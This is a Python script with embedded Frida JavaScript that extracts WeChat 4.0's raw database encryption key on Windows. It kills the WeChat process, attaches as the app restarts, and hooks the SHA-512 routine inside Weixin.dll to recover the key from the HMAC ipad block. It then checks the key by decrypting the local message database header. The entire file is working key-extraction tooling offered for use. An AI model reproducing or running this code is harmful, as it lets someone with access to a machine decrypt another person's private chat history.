#!/usr/bin/env python3
"""Self-contained Windows WeChat 4.0 raw-key extractor (the single distributable unit).

Auto-locates sha512_block inside Weixin.dll (no hard-coded address), race-attaches a freshly-restarted
WeChat, hooks the sha512 entry, and reads the raw key out of the PBKDF2 HMAC ipad block the moment
SQLCipher derives the db key. Verifies each candidate as raw key (PBKDF2->AES page1) or K1.

WHY this works: raw key/K1 are protected in memory (AES-NI round keys / wiped after use / secure heap),
but the HMAC ipad block is the plaintext `key XOR 0x36` at construction time — bypassing all protection.

REQUIREMENTS: pip install frida pycryptodome ; WeChat logged in ; run, then USER restarts WeChat
(SSH/session-0/schtasks-started WeChat is a hollow shell that never opens dbs — must be desktop-launched).

Usage: python extract_raw_key.py [seconds]   -> prints RAW KEY (and K1) on success.
"""
import frida, sys, time, hashlib, glob, subprocess
from Crypto.Cipher import AES

secs = int(sys.argv[1]) if len(sys.argv) > 1 else 90
sys.stdout.reconfigure(line_buffering=True)  # 远程/CI 实时见进度(建议5: 避免块缓冲憋到退出)

# --- verification target: any message db's page1 (raw key is account-wide; salt is per-db) ---
dbs = glob.glob(r"C:\Users\*\Documents\xwechat_files\*\db_storage\message\message_0.db")
if not dbs:
    print("ERR: message_0.db not found"); sys.exit(1)
page1 = open(dbs[0], "rb").read(4096)
salt, iv, ct = page1[:16], page1[4016:4032], page1[16:32]

def hdr_ok(pt):
    return pt[0] == 0x10 and pt[1] == 0x00 and pt[4] == 0x50 and pt[5] == 0x40 and pt[7] == 0x20

found = {}
def on_msg(m, d):
    if m.get("type") != "send":
        return
    p = m.get("payload", "")
    if not isinstance(p, str):
        return
    if p.startswith("KEY:"):
        kh = p[4:]
        if kh in found:
            return
        k = bytes.fromhex(kh)
        try:
            enc = hashlib.pbkdf2_hmac("sha512", k, salt, 256000, 32)
            if hdr_ok(AES.new(enc, AES.MODE_CBC, iv).decrypt(ct)):
                found[kh] = "raw"; print("\n*** RAW KEY:", kh, "\n(account-wide; decrypts all dbs)"); return
        except Exception:
            pass
        try:
            if hdr_ok(AES.new(k, AES.MODE_CBC, iv).decrypt(ct)):
                found[kh] = "k1"; print("*** K1 (this db only):", kh)
        except Exception:
            pass
    else:
        print(p)

def main_pid():
    r = subprocess.run(["powershell", "-NoProfile", "-Command",
        "Get-Process Weixin -EA SilentlyContinue | Where-Object {$_.WorkingSet64 -gt 20MB} | Sort-Object WorkingSet64 -Descending | Select-Object -First 1 -ExpandProperty Id"],
        capture_output=True, text=True)
    s = r.stdout.strip()
    return int(s) if s.isdigit() else None

# --- race-attach: kill WeChat, wait for the USER to restart it, attach the instant it loads (pre-db) ---
subprocess.run(["taskkill", "/F", "/IM", "Weixin.exe"], capture_output=True)
for _ in range(100):  # 等旧进程全退出再 race, 否则会抢到正被杀的僵尸进程→ACCESS_DENIED 崩(建议3)
    if main_pid() is None:
        break
    time.sleep(0.1)
print(">>> Now RESTART WeChat from the desktop (double-click). Race-attaching... <<<")
dev = frida.get_local_device()
pid = None
for _ in range(int(secs / 0.04)):
    pid = main_pid()
    if pid:
        break
    time.sleep(0.04)
if not pid:
    print("ERR: WeChat did not start"); sys.exit(1)
print("attached pid:", pid)
session = dev.attach(pid)

# --- JS: auto-locate sha512_block entry, hook it, emit HMAC ipad keys ---
JS = r"""
var m = Process.findModuleByName("Weixin.dll");
// 1) SHA-512 round constant K[0]=0x428a2f98d728ae22 (LE) -> K-table
var kh = Memory.scanSync(m.base, m.size, "22 ae 28 d7 98 2f 8a 42");
if (!kh.length) { send("ERR: SHA512 K-table not found"); throw 0; }
var Ktab = kh[0].address;
// 2) xref: lea reg,[rip+disp] whose target == K-table
var lea = null;
["48 8d", "4c 8d"].forEach(function(op){
  ["05","0d","15","1d","25","2d","35","3d"].forEach(function(mr){
    if (lea) return;
    try { Memory.scanSync(m.base, m.size, op + " " + mr).forEach(function(r){
      if (lea) return;
      var I = r.address, disp = I.add(3).readS32();
      if (I.add(7).add(disp).equals(Ktab)) lea = I;
    }); } catch(e){}
  });
});
if (!lea) { send("ERR: K-table xref not found"); throw 0; }
// 3) entry = first instruction after the 0xCC padding preceding lea
var entry = null;
for (var b = 0; b < 8192; b++) {
  var a = lea.sub(b);
  try { if (new Uint8Array(a.sub(1).readByteArray(1))[0] === 0xCC) { entry = a; break; } } catch(e){}
}
if (!entry) { send("ERR: entry not found"); throw 0; }
send("sha512 entry @ " + entry + " (rva " + entry.sub(m.base) + ")");
// 4) hook entry; rdx = input block; HMAC ipad = key XOR 0x36 || 0x36*96
function checkPad(p, pad) {
  try { var b = new Uint8Array(p.readByteArray(128)); for (var j=32;j<128;j++) if (b[j]!==pad) return null;
    var s=""; for (var k=0;k<32;k++) s+=('0'+(b[k]^pad).toString(16)).slice(-2); return s; } catch(e){ return null; }
}
var seen = {};
Interceptor.attach(entry, { onEnter: function(){
  var ip = checkPad(this.context.rdx, 0x36); if (ip && !seen[ip]) { seen[ip]=1; send("KEY:" + ip); }
}});
send("hooked sha512 entry; waiting for startup PBKDF2 (raw key)...");
"""
s = session.create_script(JS)
s.on("message", on_msg)
s.load()
time.sleep(secs)
raws = [k for k, v in found.items() if v == "raw"]
print("\nDONE. raw key:", raws[0] if raws else "(not captured — ensure WeChat was DESKTOP-restarted)")
